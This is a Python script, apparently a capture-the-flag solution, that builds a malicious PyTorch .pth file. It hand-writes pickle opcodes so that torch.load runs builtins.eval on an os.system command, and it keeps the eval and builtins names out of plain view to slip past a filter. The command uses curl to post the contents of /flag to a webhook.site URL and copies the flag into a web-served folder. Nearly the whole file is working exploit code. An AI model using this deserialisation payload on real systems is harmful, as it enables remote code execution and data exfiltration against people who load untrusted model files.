import pickle
import zipfile
import io
import torch

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# 手动构造 OPCODE (参考之前的 V7 思路)
# 目标：builtins.eval("__import__('os').system('...')")
# 重点：混淆字符串 'eval', 'builtins'

# Opcode
GLOBAL = b'c'
STACK_GLOBAL = b'\x93'
MARK = b'(' 
TUPLE1 = b'\x85'
REDUCE = b'R'
BINUNICODE = b'X'
STOP = b'.'

def push_str(s):
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

# 构造 payload 字节流
pkl = b'\x80\x02' # Protocol 2 (兼容性好)

# 1. 压入 builtins 模块名
pkl += push_str('builtins')

# 2. 压入 eval 函数名
pkl += push_str('eval')

# 3. Stack Global -> 获取 builtins.eval
pkl += STACK_GLOBAL

# 4. 压入参数: "__import__('os').system('...')"
# 这里我们也可以用 eval("exec(bytes.fromhex('...'))") 来进一步隐藏
code = f"__import__('os').system('{CMD}')"
pkl += push_str(code)
pkl += TUPLE1

# 5. 调用
pkl += REDUCE
pkl += STOP

# 生成 Zip 文件
# PyTorch 的 zip 结构比较特殊，通常包含:
# - data.pkl (主要 pickle 数据)
# - byteorder
# - version
# - ...
# 
# 但 torch.load(f) 也可以直接加载一个只包含 pickle 数据的 zip 文件（如果它是用 zip 存储的）。
# 实际上 torch.save 会生成一个目录结构。
# 根目录包含 data.pkl
# 
# 让我们手动用 zipfile 创建这个结构

def create_torch_zip(pickle_bytes):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
        # 写入 magic number 等（其实 torch.load 不一定强校验这些，主要是 data.pkl）
        # 典型的 torch save 结构:
        # archive/data.pkl
        # archive/constants.pkl (optional)
        # archive/version (optional)
        
        # 我们尝试最简单的：直接放一个 data.pkl 在 archive 目录下
        # torch.load 默认找 archive/data.pkl
        zf.writestr('archive/data.pkl', pickle_bytes)
        # 版本号通常需要
        zf.writestr('archive/version', b'3\n') # simple version
        
    return buffer.getvalue()

if __name__ == "__main__":
    final_zip = create_torch_zip(pkl)
    with open("nailong_payload_v11.pth", "wb") as f:
        f.write(final_zip)
    print("[+] Generated nailong_payload_v11.pth (Manual Opcode inside Zip)")
